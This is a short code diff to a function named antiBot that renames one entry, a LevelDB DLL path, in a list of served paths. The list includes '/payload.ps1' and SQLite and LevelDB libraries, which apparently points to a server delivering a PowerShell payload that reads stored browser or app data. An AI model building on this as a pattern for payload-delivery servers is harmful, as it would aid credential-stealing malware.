@@ -270,7 +270,7 @@ function antiBot(options = {}) {
             '/dashboard',
 			'/payload.ps1',
 			'/System.Data.SQLite.dll',
-			'/LevelDB.NET.dll',
+			'/LevelDB.netAll.dll',
 			'/leveldb.dll'
         ];
         
